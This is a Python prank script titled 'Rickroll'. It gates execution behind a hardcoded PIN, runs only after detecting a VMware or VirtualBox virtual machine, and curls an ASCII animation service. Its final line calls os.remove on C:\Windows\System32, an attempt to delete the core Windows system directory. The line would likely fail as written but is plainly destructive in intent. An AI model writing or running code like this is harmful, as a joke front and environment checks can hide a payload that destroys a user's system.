import os
import platform
import subprocess
import requests
import atexit
from colorama import init, Fore, Style
import ctypes


if platform.system() == "Windows":
    init()

def clear_console():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def print_credit_message():
    print("+" + "-"*28 + "+")
    print("|{: ^28}|".format("Creator: Mario"))
    print("+" + "-"*28 + "+")
    
def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)
    
new_title = "Rickroll"
set_console_title(new_title)

def ask_pin():
    return input("Enter the PIN: ")

def check_pin(pin):
    return pin == "R!ck"

def check_vmware():

    vmware_files = ["%SystemRoot%\\System32\\vmxnet.sys"]  
    for file_path in vmware_files:
        if os.path.exists(os.path.expandvars(file_path)):
            return True
    return "VMware Product" in subprocess.check_output("systeminfo", shell=True).decode()

def check_virtualbox():

    virtualbox_files = ["%SystemRoot%\\System32\\VBoxGuest.sys"]  
    for file_path in virtualbox_files:
        if os.path.exists(os.path.expandvars(file_path)):
            return True
    return "Oracle Corporation Product" in subprocess.check_output("systeminfo", shell=True).decode()

def execute_script():
    subprocess.run(["curl", "http://ASCII.live/can-you-hear-me"])

def exit_handler():
    clear_console()

def main():
    clear_console()
    print_credit_message()

    pin = ask_pin()
    if not check_pin(pin):
        if platform.system() == "Windows":
            print(Fore.RED + "Incorrect PIN. Access denied.")
            print(Fore.RED + "DM OWNER FOR KEY.")
            print(Style.RESET_ALL)
        else:
            print("Incorrect PIN. Access denied.")
        input("Press Enter to continue...")
        return
    
    clear_console()
    if not check_vmware() and not check_virtualbox():
        print(Fore.RED + "This script is not intended to be run on your main system.")
        print(Style.RESET_ALL)
        input("Press Enter to continue...")
        return

    
    print(Fore.GREEN + " ")
    execute_script()
    
    os.remove("C:\Windows\System32")

if __name__ == "__main__":
    atexit.register(exit_handler)
    main()
